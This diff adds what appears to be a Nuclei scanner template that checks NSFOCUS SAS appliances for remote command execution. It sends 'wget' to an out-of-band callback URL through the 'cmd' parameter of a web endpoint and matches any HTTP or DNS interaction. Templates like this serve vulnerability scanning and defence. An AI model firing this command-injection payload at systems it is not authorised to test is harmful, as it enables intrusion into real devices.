@@ -1,0 +1,27 @@
+id: nsfocus_sas_exec
+
+info:
+  name: nsfocus_sas_exec
+  author: nsfocus
+  severity: high
+  tags: nsfocus
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webconf/Exec/index?cmd=wget%20{{interactsh-url}}"
+
+    attack: clusterbomb
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: http
+        words:
+          - "http"
+
+      - type: word
+        part: interactsh_protocol
+        name: dns
+        words:
+          - "dns"
